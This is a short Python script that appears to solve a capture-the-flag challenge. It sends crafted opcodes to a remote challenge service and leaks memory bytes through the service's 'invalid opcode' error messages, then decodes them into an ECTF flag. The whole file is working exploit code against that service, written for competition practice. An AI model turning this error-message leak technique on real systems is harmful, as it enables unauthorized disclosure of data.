import socket
import re
import time

HOST, PORT = "pwn-my-ship.esaip-cyber.com", 55555

flag = ""

for i in range(0x50, 0x50 + 18, 2):
    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    skt.connect((HOST, PORT))
    
    skt.send(b"2\n")

    opcode = 0x1000 | i
    skt.send(int.to_bytes(opcode, 2, 'big') + b"\n")

    while True:
        data = skt.recv(999999999)
        if data != b'':
            res = re.findall(r"Opcode '0x(.+)' is invalid", data.decode())

            if len(res) != 0:
                flag += res[0]
                print(f"New chars found: {flag}")
                break

    
    skt.close()
    # time.sleep(0.1)

print("ECTF{%s}" % bytes.fromhex(flag).decode())
